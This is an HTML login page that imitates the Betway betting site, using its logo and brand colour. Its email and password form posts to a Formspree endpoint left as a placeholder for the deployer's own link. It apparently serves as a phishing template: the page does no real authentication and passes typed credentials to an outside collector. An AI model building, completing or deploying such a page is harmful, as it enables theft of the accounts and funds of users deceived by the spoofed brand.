<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Betway Style Login</title>

    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: #ffffff;
            width: 340px;
            padding: 35px 28px;
            border-radius: 12px;
            box-shadow: 0 4px 18px rgba(0,0,0,0.12);
        }

        .logo {
            width: 140px;
            display: block;
            margin: 0 auto 25px auto;
        }

        h2 {
            text-align: center;
            font-size: 22px;
            margin-bottom: 25px;
            color: #1c1c1c;
        }

        input {
            width: 100%;
            padding: 13px;
            border: 1px solid #c9c9c9;
            border-radius: 6px;
            margin-bottom: 14px;
            font-size: 15px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: #00a651; /* Betway green */
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: .3s;
        }

        .btn:hover {
            background: #008f46;
        }

        .bottom-text {
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
        }

        .bottom-text a {
            color: #00a651;
            text-decoration: none;
        }
    </style>
</head>

<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Betway_Logo.png/320px-Betway_Logo.png" 
             class="logo" alt="Betway Logo" />

        <h2>Login</h2>

        <!-- Formspree login form -->
        <form action="YOUR_FORMSPREE_LINK_HERE" method="POST">
            <input type="email" name="email" placeholder="Email" required />
            <input type="password" name="password" placeholder="Password" required />
            <button class="btn" type="submit">Login</button>
        </form>

        <div class="bottom-text">
            Forgot your password? <a href="#">Recover</a>
        </div>
    </div>

</body>
</html>
